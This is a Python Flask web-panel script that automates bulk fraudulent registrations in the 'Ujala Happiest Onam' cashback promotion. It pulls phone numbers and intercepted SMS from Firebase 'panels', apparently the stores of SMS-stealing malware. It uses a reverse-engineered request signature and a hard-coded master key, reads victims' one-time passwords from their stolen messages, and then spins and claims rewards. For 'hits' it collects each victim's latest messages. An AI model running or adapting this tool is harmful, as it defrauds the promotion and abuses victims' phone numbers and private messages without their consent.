#!/usr/bin/env python3
"""
Ujala Happiest Onam - Web Panel (m.py converted)
- 10 concurrent workers, batch processing, 4 sec delay
- Hit threshold: 50 Cashback
- Full web UI with live logs, stats, accounts, hits
- On hit: fetches last 5 messages from Firebase
- 100% IN-MEMORY operation (NO JSON FILES ARE SAVED ON DISK)
"""

import os
import sys
import json
import threading
import time
import re
import base64
import urllib.parse
import random
import string
import hmac
import hashlib
import io  # For in-memory exports
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Tuple

import requests
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit

# ==================== CONFIG ====================
BASE_URL = "https://www.ujalahappiestonam.com/api/users"
MASTER_KEY = "660395654"
HIT_THRESHOLD = 50          # Cashback >= 50 = Hit
BATCH_SIZE = 30
DELAY_BETWEEN_BATCHES = 2   # seconds
OTP_TIMEOUT = 15            # seconds to wait for OTP

# ==================== GLOBAL SESSION ====================
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.ujalahappiestonam.com",
    "Referer": "https://www.ujalahappiestonam.com/",
})

# ==================== FLASK APP ====================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'ujala-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ==================== DATA CLASSES ====================
@dataclass
class Account:
    phone: str
    name: str
    reward: str
    reward_value: int
    token: str
    user_key: str
    data_key: str
    device_id: str
    panel_url: str
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        return {
            'phone': self.phone,
            'name': self.name,
            'reward': self.reward,
            'reward_value': self.reward_value,
            'token': self.token,
            'user_key': self.user_key,
            'data_key': self.data_key,
            'device_id': self.device_id,
            'panel_url': self.panel_url,
            'created_at': self.created_at
        }

# ==================== MANAGERS (ALL IN-MEMORY) ====================
class AccountManager:
    def __init__(self):
        self.accounts: List[Account] = []
        self.processed_numbers: Set[str] = set()
        self.successful_numbers: Set[str] = set()
        self.stats = {
            'total_processed': 0,
            'successful': 0,
            'failed': 0,
            'hits': 0,
            'total_balance': 0,
            'otp_timeout': 0,
            'verification_failed': 0,
            'spin_failed': 0,
            'claim_failed': 0
        }
        self._lock = threading.Lock()

    def add_account(self, account: Account, is_hit: bool = False):
        with self._lock:
            for existing in self.accounts:
                if existing.phone == account.phone:
                    return False
            self.accounts.append(account)
            self.successful_numbers.add(account.phone)
            self.processed_numbers.add(account.phone)
            self.stats['successful'] += 1
            self.stats['total_balance'] += account.reward_value
            if is_hit:
                self.stats['hits'] += 1
            return True

    def mark_processed(self, phone: str):
        with self._lock:
            if phone not in self.processed_numbers:
                self.processed_numbers.add(phone)
                self.stats['total_processed'] += 1

    def mark_failed(self, phone: str, reason: str = 'Unknown'):
        with self._lock:
            self.stats['failed'] += 1
            if reason == 'OTP Timeout':
                self.stats['otp_timeout'] += 1
            elif reason == 'Verification Failed':
                self.stats['verification_failed'] += 1
            elif reason == 'Spin Failed':
                self.stats['spin_failed'] += 1
            elif reason == 'Claim Failed':
                self.stats['claim_failed'] += 1

    def is_processed(self, phone: str) -> bool:
        return phone in self.processed_numbers

    def get_stats(self) -> Dict:
        return self.stats.copy()

    def get_accounts(self) -> List[Dict]:
        return [acc.to_dict() for acc in self.accounts]

class HitManager:
    def __init__(self):
        self.hits: List[Dict] = []
        self._lock = threading.Lock()

    def add_hit(self, account: Account, messages: List[Dict], device_id: str, panel_url: str) -> bool:
        with self._lock:
            for hit in self.hits:
                if hit.get('phone') == account.phone:
                    return False
            hit_data = account.to_dict()
            hit_data['messages'] = messages
            hit_data['device_id'] = device_id
            hit_data['panel_url'] = panel_url
            self.hits.append(hit_data)
            return True

    def get_hits(self) -> List[Dict]:
        return self.hits.copy()

    def get_hit(self, index: int) -> Optional[Dict]:
        if 0 <= index < len(self.hits):
            return self.hits[index].copy()
        return None

    def get_messages_for_hit(self, index: int) -> List[Dict]:
        hit = self.get_hit(index)
        if hit:
            return hit.get('messages', [])
        return []

    def refresh_messages_for_hit(self, index: int) -> List[Dict]:
        hit = self.get_hit(index)
        if not hit:
            return []
        panel_url = hit.get('panel_url', '')
        device_id = hit.get('device_id', '')
        if not panel_url or not device_id:
            return []
        messages = fetch_messages_for_device(panel_url, device_id, limit=5)
        with self._lock:
            self.hits[index]['messages'] = messages
        return messages

class PanelManager:
    def __init__(self):
        self.panels: List[str] = []
        self.current_index: int = 0

    def add_panels(self, urls: List[str]) -> int:
        added = 0
        for url in urls:
            url = url.strip()
            if not url:
                continue
            parsed = self.parse_panel_link(url)
            if not parsed:
                continue
            if parsed not in self.panels:
                self.panels.append(parsed)
                added += 1
        return added

    def parse_panel_link(self, link: str) -> Optional[str]:
        link = link.strip()
        if "?s=" in link:
            parsed = urllib.parse.urlparse(link)
            qs = urllib.parse.parse_qs(parsed.query)
            if 's' in qs:
                s_param = qs['s'][0]
                s_param += "=" * ((4 - len(s_param) % 4) % 4)
                try:
                    decoded = base64.b64decode(s_param).decode('utf-8')
                    for sep in ['|||', '|']:
                        if sep in decoded:
                            parts = decoded.split(sep)
                            if len(parts) >= 2:
                                firebase_url = parts[0].strip()
                                if not firebase_url.endswith('/'):
                                    firebase_url += '/'
                                return firebase_url
                except:
                    pass
        if "firebaseio.com" in link or "firebasedatabase.app" in link:
            if not link.endswith('/'):
                link += '/'
            return link
        return None

    def get_current_panel(self) -> Optional[str]:
        if self.panels and 0 <= self.current_index < len(self.panels):
            return self.panels[self.current_index]
        return None

    def set_current_panel(self, index: int) -> bool:
        if 0 <= index < len(self.panels):
            self.current_index = index
            return True
        return False

    def remove_panel(self, index: int) -> bool:
        if 0 <= index < len(self.panels):
            self.panels.pop(index)
            if self.current_index >= len(self.panels):
                self.current_index = max(0, len(self.panels) - 1)
            return True
        return False

    def move_to_next(self) -> bool:
        if not self.panels:
            return False
        self.current_index = (self.current_index + 1) % len(self.panels)
        return True

    def get_panels(self) -> List[str]:
        return self.panels.copy()

    def get_panel_count(self) -> int:
        return len(self.panels)

# ==================== GLOBAL INSTANCES ====================
account_manager = AccountManager()
hit_manager = HitManager()
panel_manager = PanelManager()

# Global automation state
automation_running = False
automation_thread = None
current_workers = 0
recent_accounts = []   # list of dicts for UI
recent_hits = []       # list of dicts for UI
numbers_found = []     # list of phone numbers from current panel

# ==================== SOCKETIO LOGGING ====================
def send_log(message: str, log_type: str = 'info'):
    """Send log to web UI via SocketIO"""
    log_entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'message': message,
        'type': log_type
    }
    socketio.emit('new_log', log_entry)
    print(f"[{log_entry['timestamp']}] {message}")

def update_status():
    """Send full status update to UI"""
    status = {
        'running': automation_running,
        'total_processed': account_manager.stats['total_processed'],
        'successful': account_manager.stats['successful'],
        'failed': account_manager.stats['failed'],
        'hits': account_manager.stats['hits'],
        'total_balance': account_manager.stats['total_balance'],
        'current_number': '',
        'active_workers': current_workers,
        'numbers_found': numbers_found,
        'recent_accounts': recent_accounts,
        'recent_hits': recent_hits,
        'current_panel': panel_manager.get_current_panel() or 'None',
        'panel_index': panel_manager.current_index + 1,
        'total_panels': panel_manager.get_panel_count()
    }
    socketio.emit('status_update', status)

# ==================== NEW FUNCTION: FETCH MESSAGES ====================
def fetch_messages_for_device(panel_url: str, device_id: str, limit: int = 5) -> List[Dict]:
    if not panel_url or not device_id:
        return []

    try:
        url = f"{panel_url}messages/{device_id}.json"
        resp = requests.get(url, timeout=5)
        if resp.status_code != 200:
            return []

        msgs = resp.json()
        if not msgs:
            return []

        sorted_items = sorted(
            msgs.items(),
            key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
            reverse=True
        )[:limit]

        messages = []
        for msg_id, msg_data in sorted_items:
            if isinstance(msg_data, dict):
                messages.append({
                    'sender': msg_data.get('sender', 'Unknown'),
                    'text': msg_data.get('body') or msg_data.get('message') or msg_data.get('text', ''),
                    'timestamp': msg_id
                })
        return messages
    except Exception as e:
        send_log(f"Error fetching messages for device {device_id}: {e}", 'error')
        return []

# ==================== UJALA API FUNCTIONS ====================
def generate_signature_data(payload: dict, user_key: str, data_key: str) -> str:
    payload_str = json.dumps(payload, separators=(',', ':'))
    a = base64.b64encode(payload_str.encode()).decode()
    ts = str(payload['t'])
    u = base64.b64encode(ts.encode()).decode()
    hmac_key = data_key[4:18].encode()
    message = f"{u}.{a}".encode()
    h = hmac.new(hmac_key, message, hashlib.sha256)
    hex_sig = h.hexdigest()
    f = base64.b64encode(hex_sig.encode()).decode()
    m = random.randint(1, 6)
    k = random.randint(2, 8)
    alphabet = string.ascii_letters + string.digits
    h_rand = "".join(random.choice(alphabet) for _ in range(k))
    g = f"{k}{m}{f[0:m]}{h_rand}{f[m:]}"
    return f"{u}.{a}.{g}"

def decrypt_resp(encrypted: str):
    try:
        return json.loads(base64.b64decode(encrypted).decode()), True
    except:
        return {"error": "decrypt_failed", "raw": encrypted}, False

def get_timestamp():
    return int(time.time() * 1000)

def create_user():
    try:
        r = session.post(f"{BASE_URL}", json={"masterKey": MASTER_KEY}, timeout=10)
        data = r.json()
        decoded, ok = decrypt_resp(data.get("resp", ""))
        if not ok or decoded.get("statusCode") != 200:
            return None, None
        return str(decoded["userKey"]), decoded["dataKey"]
    except Exception as e:
        send_log(f"❌ Create user failed: {e}", 'error')
        return None, None

def send_otp(user_key, data_key, name, mobile, code, image_path, city="Kerala"):
    if not os.path.exists(image_path):
        send_log("❌ Image file not found!", 'error')
        return False
    try:
        t = get_timestamp()
        payload = {
            "name": name,
            "mobile": mobile,
            "email": "",
            "city": city,
            "code": code,
            "agreed1": "Yes",
            "agreed2": "Yes",
            "userKey": int(user_key),
            "t": t
        }
        data_value = generate_signature_data(payload, user_key, data_key)
        files = {"pack": ("pack.jpg", open(image_path, "rb"), "image/jpeg")}
        form_data = {"t": str(t), "userKey": user_key, "data": data_value}
        r = session.post(
            f"{BASE_URL}/getOTP/{user_key}?t={t}",
            data=form_data,
            files=files,
            timeout=15
        )
        files["pack"][1].close()

        try:
            resp_json = r.json()
            decoded, ok = decrypt_resp(resp_json.get("resp", ""))
            return ok and decoded.get("statusCode") == 200
        except:
            return False
    except Exception as e:
        send_log(f"❌ send_otp exception: {e}", 'error')
        return False

def verify_otp(user_key, data_key, otp):
    try:
        t = get_timestamp()
        payload = {"otp": otp, "userKey": int(user_key), "t": t}
        data_value = generate_signature_data(payload, user_key, data_key)
        u, a, g = data_value.split(".", 2)
        body = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        r = session.post(
            f"{BASE_URL}/verifyOTP/{user_key}?t={t}",
            data=body,
            headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
            timeout=10
        )
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return decoded.get("token")
        return None
    except:
        return None

def spin_wheel(user_key, data_key, token):
    try:
        t = get_timestamp()
        payload = {"userKey": int(user_key), "t": t}
        data_value = generate_signature_data(payload, user_key, data_key)
        u, a, g = data_value.split(".", 2)
        body = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": f"Bearer {token}"
        }
        r = session.post(
            f"{BASE_URL}/speenTheWheel/{user_key}?t={t}",
            data=body,
            headers=headers,
            timeout=10
        )
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return decoded.get('reward', 'Unknown')
        return None
    except:
        return None

def claim_reward(user_key, data_key, token):
    try:
        t = get_timestamp()
        payload = {"userKey": int(user_key), "t": t}
        data_value = generate_signature_data(payload, user_key, data_key)
        u, a, g = data_value.split(".", 2)
        body = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization": f"Bearer {token}"
        }
        r = session.post(
            f"{BASE_URL}/claimNow/{user_key}?t={t}",
            data=body,
            headers=headers,
            timeout=10
        )
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return True
        return False
    except:
        return False

# ==================== PANEL HELPERS ====================
def fetch_phones_from_panel(panel_url: str, limit: int = 100):
    try:
        resp = requests.get(f"{panel_url}clients.json", timeout=15)
        clients = resp.json() or {}
    except requests.exceptions.Timeout:
        send_log(f"⏰ Timeout fetching clients from {panel_url}", 'warning')
        return []
    except Exception as e:
        send_log(f"❌ Failed to fetch clients: {e}", 'error')
        return []

    phones = []
    count = 0
    for c_id, c_data in clients.items():
        if count >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        if not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile") or c_data.get("phoneNumber")
        if not phone:
            try:
                msg_resp = requests.get(f"{panel_url}messages/{c_id}.json", timeout=3)
                if msg_resp.status_code == 200:
                    msgs = msg_resp.json() or {}
                    for msg in msgs.values():
                        if not isinstance(msg, dict):
                            continue
                        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                        match = re.search(r'\b([6-9]\d{9})\b', text)
                        if match:
                            phone = match.group(1)
                            break
            except:
                pass
        if phone:
            phone = re.sub(r'\D', '', str(phone))
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                count += 1
    return phones

def fetch_otp_from_sms(panel_url, device_id, timeout=15):
    start_time = time.time()
    checked_keys = set()
    possible_paths = ["messages", "inbox", "received", "sms"]
    all_matches = []

    while time.time() - start_time < timeout:
        for path in possible_paths:
            try:
                url = f"{panel_url}{path}/{device_id}.json"
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    if data and isinstance(data, dict):
                        for sms_key, sms_value in data.items():
                            if sms_key in checked_keys:
                                continue
                            checked_keys.add(sms_key)

                            body = ""
                            date_time_str = ""
                            if isinstance(sms_value, dict):
                                body = sms_value.get("body") or sms_value.get("message") or sms_value.get("text") or ""
                                date_time_str = sms_value.get("dateTime") or sms_value.get("timestamp") or sms_value.get("date") or ""
                            elif isinstance(sms_value, str):
                                body = sms_value
                            
                            body = body.strip()
                            if not body:
                                continue

                            match = re.search(r'Your OTP to register is (\d{6})', body, re.IGNORECASE)
                            if match:
                                otp = match.group(1)
                                dt = None
                                if date_time_str:
                                    try:
                                        dt = datetime.strptime(date_time_str, "%d-%m-%Y | %I:%M %p")
                                    except:
                                        pass
                                all_matches.append((dt, otp))
            except:
                pass
        time.sleep(0.5)

    if all_matches:
        valid = [m for m in all_matches if m[0] is not None]
        invalid = [m for m in all_matches if m[0] is None]
        if valid:
            valid.sort(key=lambda x: x[0], reverse=True)
            return valid[0][1]
        elif invalid:
            return invalid[0][1]
    return None

# ==================== WORKER THREAD ====================
def process_mobile_number(mobile, name, code, image_path, panel_url, device_id):
    global current_workers, recent_accounts, recent_hits

    account_manager.mark_processed(mobile)
    send_log(f"[📱] Processing: {mobile} (device: {device_id[:8]}...)", 'info')

    user_key, data_key = create_user()
    if not user_key:
        send_log(f"❌ {mobile} - Create user failed", 'error')
        account_manager.mark_failed(mobile, 'Create User')
        return

    if not send_otp(user_key, data_key, name, mobile, code, image_path):
        send_log(f"❌ {mobile} - OTP send failed", 'error')
        account_manager.mark_failed(mobile, 'OTP Send')
        return

    send_log(f"✅ {mobile} - OTP sent", 'success')

    otp = fetch_otp_from_sms(panel_url, device_id, timeout=OTP_TIMEOUT)
    if not otp:
        send_log(f"⏰ {mobile} - OTP timeout", 'warning')
        account_manager.mark_failed(mobile, 'OTP Timeout')
        return

    send_log(f"✅ {mobile} - OTP found: {otp}", 'success')

    token = verify_otp(user_key, data_key, otp)
    if not token:
        send_log(f"❌ {mobile} - OTP verification failed", 'error')
        account_manager.mark_failed(mobile, 'Verification Failed')
        return

    send_log(f"✅ {mobile} - Verified", 'success')

    reward = spin_wheel(user_key, data_key, token)
    if not reward:
        send_log(f"❌ {mobile} - Spin failed", 'error')
        account_manager.mark_failed(mobile, 'Spin Failed')
        return

    if claim_reward(user_key, data_key, token):
        reward_value = 0
        try:
            match = re.search(r'(\d+)', reward)
            if match:
                reward_value = int(match.group(1))
        except:
            pass

        is_hit = reward_value >= HIT_THRESHOLD

        account = Account(
            phone=mobile,
            name=name,
            reward=reward,
            reward_value=reward_value,
            token=token,
            user_key=user_key,
            data_key=data_key,
            device_id=device_id,
            panel_url=panel_url
        )

        account_manager.add_account(account, is_hit)

        if is_hit:
            messages = fetch_messages_for_device(panel_url, device_id, limit=5)
            hit_manager.add_hit(account, messages, device_id, panel_url)
            hit_index = len(hit_manager.get_hits()) - 1   # Send index to UI
            send_log(f"⭐ HIT! {mobile} → {reward} (value: {reward_value}) - messages fetched", 'hit')
            recent_hits.insert(0, {
                'phone': mobile,
                'reward': reward,
                'value': reward_value,
                'name': name,
                'time': datetime.now().strftime('%H:%M:%S'),
                'hit_index': hit_index                     # This binds the button to the hit
            })
            if len(recent_hits) > 20:
                recent_hits = recent_hits[:20]
        else:
            send_log(f"✅ SUCCESS! {mobile} → {reward} (value: {reward_value})", 'success')

        recent_accounts.insert(0, {
            'phone': mobile,
            'reward': reward,
            'value': reward_value,
            'name': name,
            'is_hit': is_hit,
            'time': datetime.now().strftime('%H:%M:%S')
        })
        if len(recent_accounts) > 50:
            recent_accounts = recent_accounts[:50]

        update_status()
    else:
        send_log(f"⚠️ {mobile} - Spin got reward but claim failed: {reward}", 'warning')
        account_manager.mark_failed(mobile, 'Claim Failed')

# ==================== AUTOMATION LOOP ====================
def automation_worker():
    global automation_running, current_workers, numbers_found

    while automation_running:
        try:
            panel_url = panel_manager.get_current_panel()
            if not panel_url:
                send_log("⚠️ No panel selected. Please add a Firebase URL.", 'warning')
                time.sleep(5)
                continue

            send_log(f"📡 Fetching devices from {panel_url}", 'info')
            devices = fetch_phones_from_panel(panel_url, limit=5000)
            if not devices:
                send_log(f"⚠️ No active devices in {panel_url}", 'warning')
                panel_manager.move_to_next()
                time.sleep(2)
                continue

            numbers_found = [phone for phone, _ in devices]
            send_log(f"📋 Found {len(devices)} devices", 'info')

            available = [(phone, dev) for phone, dev in devices if not account_manager.is_processed(phone)]
            if not available:
                send_log(f"✅ All devices in this panel processed. Moving to next panel.", 'success')
                panel_manager.move_to_next()
                time.sleep(2)
                continue

            send_log(f"🆕 {len(available)} new devices to process", 'info')

            total_available = len(available)
            processed = 0
            batch_num = 1

            while processed < total_available and automation_running:
                batch = available[processed:processed + BATCH_SIZE]
                send_log(f"🚀 Batch {batch_num}: Processing {len(batch)} devices", 'info')

                threads = []
                for phone, device_id in batch:
                    name = f"{random.choice(['Aarav','Vivaan','Aditya','Vihaan','Arjun','Sai','Reyansh','Ayaan','Ananya','Aadhya','Diya','Myra','Sara','Anika','Pari','Aarohi','Kiara'])} {random.choice(['Nair','Menon','Pillai','Kurup','Nambiar','Warrier','Panicker','Thampi','Varma'])}"
                    t = threading.Thread(
                        target=process_mobile_number,
                        args=(phone, name, code, image_path, panel_url, device_id)
                    )
                    threads.append(t)
                    t.start()

                current_workers = len(threads)
                update_status()

                for t in threads:
                    t.join()

                current_workers = 0
                processed += len(batch)
                batch_num += 1

                send_log(f"📊 Batch complete. Progress: {processed}/{total_available}", 'info')

                if processed < total_available and automation_running:
                    send_log(f"⏳ Waiting {DELAY_BETWEEN_BATCHES} seconds before next batch...", 'info')
                    time.sleep(DELAY_BETWEEN_BATCHES)

            send_log(f"🔄 All devices in this panel processed. Moving to next panel.", 'success')
            panel_manager.move_to_next()
            time.sleep(2)

        except Exception as e:
            send_log(f"❌ Automation loop error: {e}", 'error')
            time.sleep(5)

    automation_running = False
    send_log("⏹ Automation stopped", 'warning')
    update_status()

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def status():
    return jsonify({
        'running': automation_running,
        'total_processed': account_manager.stats['total_processed'],
        'successful': account_manager.stats['successful'],
        'failed': account_manager.stats['failed'],
        'hits': account_manager.stats['hits'],
        'total_balance': account_manager.stats['total_balance'],
        'active_workers': current_workers,
        'current_panel': panel_manager.get_current_panel() or 'None',
        'panel_index': panel_manager.current_index + 1,
        'total_panels': panel_manager.get_panel_count()
    })

@app.route('/api/accounts')
def accounts():
    return jsonify(account_manager.get_accounts())

@app.route('/api/hits')
def hits():
    return jsonify(hit_manager.get_hits())

@app.route('/api/hits/<int:index>')
def get_hit(index):
    hit = hit_manager.get_hit(index)
    if hit is None:
        return jsonify({'error': 'Hit not found'}), 404
    return jsonify(hit)

@app.route('/api/hits/<int:index>/messages')
def get_hit_messages(index):
    messages = hit_manager.get_messages_for_hit(index)
    return jsonify(messages)

@app.route('/api/hits/<int:index>/messages/refresh', methods=['POST'])
def refresh_hit_messages(index):
    messages = hit_manager.refresh_messages_for_hit(index)
    return jsonify(messages)

@app.route('/api/panels')
def panels():
    return jsonify({
        'panels': panel_manager.get_panels(),
        'current_index': panel_manager.current_index
    })

@app.route('/api/panels/add', methods=['POST'])
def add_panels():
    urls = request.json.get('urls', [])
    if isinstance(urls, str):
        urls = [urls]
    added = panel_manager.add_panels(urls)
    return jsonify({'added': added, 'total': panel_manager.get_panel_count()})

@app.route('/api/panels/select', methods=['POST'])
def select_panel():
    index = request.json.get('index', 0)
    if panel_manager.set_current_panel(index):
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/panels/delete', methods=['POST'])
def delete_panel():
    index = request.json.get('index', 0)
    if panel_manager.remove_panel(index):
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/panels/next', methods=['POST'])
def next_panel():
    if panel_manager.move_to_next():
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

@app.route('/api/start', methods=['POST'])
def start_automation():
    global automation_running, automation_thread
    if automation_running:
        return jsonify({'error': 'Already running'}), 400
    if not panel_manager.get_current_panel():
        return jsonify({'error': 'No panel selected'}), 400
    
    global image_path, code
    image_path = request.json.get('image_path', 'pack.jpg')
    code = request.json.get('code', '8902102126232')
    if not os.path.exists(image_path):
        return jsonify({'error': f'Image not found: {image_path}'}), 400

    automation_running = True
    automation_thread = threading.Thread(target=automation_worker, daemon=True)
    automation_thread.start()
    send_log("▶️ Automation started", 'success')
    update_status()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_automation():
    global automation_running
    automation_running = False
    send_log("⏹ Stop requested", 'warning')
    return jsonify({'success': True})

# ==================== IN-MEMORY EXPORT ROUTES (NO FILES SAVED) ====================
@app.route('/api/export/accounts')
def export_accounts():
    filename = f"ujala_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = account_manager.get_accounts()
    json_str = json.dumps(data, indent=2, ensure_ascii=False)
    return send_file(
        io.BytesIO(json_str.encode('utf-8')),
        as_attachment=True,
        download_name=filename,
        mimetype='application/json'
    )

@app.route('/api/export/hits')
def export_hits():
    filename = f"ujala_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = hit_manager.get_hits()
    json_str = json.dumps(data, indent=2, ensure_ascii=False)
    return send_file(
        io.BytesIO(json_str.encode('utf-8')),
        as_attachment=True,
        download_name=filename,
        mimetype='application/json'
    )

# ==================== SOCKETIO EVENTS ====================
@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'ok'})
    update_status()

# ==================== MAIN ====================
if __name__ == '__main__':
    print("\n" + "="*60)
    print(" 🎡 UJALA HAPPIEST ONAM - WEB PANEL (100% IN-MEMORY)")
    print("="*60)
    print(f" Hit Threshold: {HIT_THRESHOLD} Cashback")
    print(f" Batch Size: {BATCH_SIZE}")
    print(f" Delay: {DELAY_BETWEEN_BATCHES}s")
    print("="*60)
    print("\n🌐 Starting server at http://localhost:5000")
    print("📱 Open browser and enjoy! (No files saved on disk)")
    print("="*60 + "\n")
    
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False)
